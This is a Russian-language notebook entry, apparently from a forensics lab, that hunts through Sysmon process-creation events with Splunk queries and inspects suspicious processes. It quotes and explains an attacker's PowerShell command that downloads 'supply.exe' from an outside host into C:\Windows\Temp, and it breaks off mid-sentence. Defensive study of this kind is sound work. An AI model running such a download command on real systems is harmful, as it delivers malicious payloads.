Пройдемся по EventID.
index="system_logs" | rename Event.System.EventID AS EventID  Event.EventData.* AS *  - переименовали длинное название поля.

index="system_logs" | rename Event.System.EventID AS EventID  Event.EventData.* AS * | *search EventID=1* - начнем с рассмотрения всех событий с id 1 - запуск процесса. 
index="system_logs" | rename Event.System.EventID AS EventID  Event.EventData.* AS * | search EventID=1 *| table UtcTime User IntegrityLevel ParentImage Image CommandLine ParentCommandLine ProcessGuid ParentProcessGuid*  - выведем результат в таблицу 
index="system_logs" | rename Event.System.EventID AS EventID  Event.EventData.* AS * | search EventID=1 | table UtcTime User IntegrityLevel ParentImage Image CommandLine ParentCommandLine ProcessGuid ParentProcessGuid *| sort 0 UtcTime* - выстраивает все результаты по времени
![](attachment/Pasted%20image%2020261111202805.png)

| Поле                  | Что означает                                                                                                                                |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **UtcTime**           | Время события в UTC                                                                                                                         |
| **User**              | Пользователь, от имени которого запущен процесс                                                                                             |
| **IntegrityLevel**    | Уровень целостности процесса: например, `Medium` — обычный, `High` — повышенный, `System` — системный. Помогает оценить контекст привилегий |
| **ParentImage**       | Полный путь к программе, которая запустила этот процесс — его **родителю**                                                                  |
| **Image**             | Полный путь к запущенной программе                                                                                                          |
| **CommandLine**       | Команда запуска текущего процесса вместе с аргументами                                                                                      |
| **ParentCommandLine** | Команда, с которой был запущен родительский процесс                                                                                         |
| **ProcessGuid**       | Уникальный идентификатор этого экземпляра процесса                                                                                          |
| **ParentProcessGuid** | Уникальный идентификатор его родительского процесса                                                                                         |
Разбираем по отдельности подозрительные процессы.

Начну с C:\Windows\System32\CompPkgSrv.exe 

![](attachment/Pasted%20image%2020261111204953.png)
Изучив связанные с ProcessGuid="747F3D96-3058-6095-AD04-000000001D00" действия вредоносной активности не обнаружено. 

![](attachment/Pasted%20image%2020261111210226.png)
 Далее мне кажется подозрительным запуск sysmon.exe из папки Temp.В норме эта утилита запускается из C:\Windows\sysmon.exe как на 3 строке.
 index="system_logs"
| spath
| rename Event.System.EventID AS EventID Event.EventData.* AS *
| *search image="Sysmon.exe"*
| table UtcTime User IntegrityLevel ParentImage Image CommandLine ParentCommandLine ProcessGuid ParentProcessGuid
| sort 0 UtcTime
Посмотрю связанные процессы.
![](attachment/Pasted%20image%2020261111210819.png)
Нашла запуск cmd.exe sysmon.exe из папки Downloads/Sysmon
![](attachment/Pasted%20image%2020261111211306.png)
index="system_logs"
| spath
| rename Event.System.EventID AS EventID Event.EventData.* AS *
| search Image="*Sysmon.exe" ParentProcessGuid="747F3D96-302C-6095-9704-000000001D00"
| table UtcTime User IntegrityLevel ParentImage Image CommandLine ParentCommandLine ProcessGuid ParentProcessGuid
| sort 0 UtcTime  

подставила его Guid как ParentProcessGuid чтобы найти дочерние процессы. C:\Users\IEUser\AppData\Local\Temp\Sysmon.exe - запуск данной программы.
Исследуем что делал этот процесс. 
index="system_logs"
| spath
| rename Event.System.EventID AS EventID Event.EventData.* AS *
| search ProcessGuid="747F3D96-302C-6095-9704-000000001D00"
| table UtcTime User IntegrityLevel ParentImage Image CommandLine ParentCommandLine ProcessGuid ParentProcessGuid
| sort 0 UtcTime

Судя по выводу данный процесс не запускает дочерние процессы. Пока можем сказать что подозрительной активности связанной с sysmon.exe нет.

Следующий процесс с EventID=1 который вызывает подозрения:

![](attachment/Pasted%20image%2020261114124155.png)

cmd.exe запускает powershell с командой powershell -c INvoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe -OutFile C:\Windows\Temp\supply.exe
- **`-c`** — сокращение от `-Command`. Говорит `powershell.exe` выполнить то, что написано дальше.
- **`Invoke-WebRequest`** — команда PowerShell, которая отправляет веб-запрос и получает ответ сервера.
- **`-Uri`** — параметр, задающий адрес запроса. `http://192.168.1.11:6969/supply.exe`
Сохранение ответа в C:\Windows\Temp\supply.exe.
![](attachment/Pasted%20image%2020261114160347.png)cmd. exe запустил ftp, тот в свою очередь 